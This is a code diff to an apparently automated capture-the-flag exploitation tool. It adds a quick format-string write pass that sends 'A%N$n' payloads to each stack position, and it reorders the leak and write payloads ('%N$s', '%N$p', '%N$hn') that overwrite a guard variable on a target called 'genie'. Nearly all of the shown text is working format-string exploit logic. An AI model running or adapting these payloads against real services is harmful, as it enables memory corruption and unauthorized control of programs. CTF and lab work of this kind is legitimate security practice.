@@ -2348,6 +2348,20 @@ def run_fmt(args, report):
                     print(f"[dry] pos={i} payload={p!r}")
         return 0
 
+    # Quick first pass for a pure write: one "A%N$n" per slot. The pointer to the guarded
+    # variable is often a function argument ABOVE a 64-byte buffer (slot 24 on the genie),
+    # and three payloads per slot did not get that far inside the stage's time cap.
+    FAST_N = 48
+    if args.goal == "fmt-write":
+        for i in positions[:FAST_N]:
+            p = f"A%{i}$n"
+            try:
+                out = send_attempt(args, p.encode())
+            except OSError:
+                continue
+            if report_flag(args, p.encode(), out, f"fmt-write pos={i}"):
+                return 0
+
     for i in positions:
         if args.goal in ("fmt-leak", "auto"):
             for p in (f"%{i}$s", f"%{i}$p", f"%x%x%x%x%x%x-%s", f"%x%x%x%x-%s"):
@@ -2360,9 +2374,13 @@ def run_fmt(args, report):
                 if report_flag(args, p.encode(), out, f"fmt-leak pos={i}", strong_only=True):
                     return 0
         if args.goal in ("fmt-write", "auto"):
-            for p in (f"%{i}$n", f"%{i}$hn", f"%x-%n", f"%x%x%n", f"%x%x%x%n", f"%x%x%x%x%n"):
+            # "A" first: a bare %N$n writes the count printed so far, which is 0, so a guard
+            # that must become NON-zero (genie: if (wishes != 0)) is never satisfied by it.
+            for p in (f"A%{i}$n", f"%{i}$n", f"%{i}$hn", f"%x-%n", f"%x%x%n", f"%x%x%x%n", f"%x%x%x%x%n"):
                 if i > 1 and p.startswith("%x") and "$" not in p:
                     break
+                if p.startswith("A") and args.goal == "fmt-write" and i <= FAST_N:
+                    continue                    # already sent in the quick pass
                 try:
                     out = send_attempt(args, p.encode())
                 except OSError:
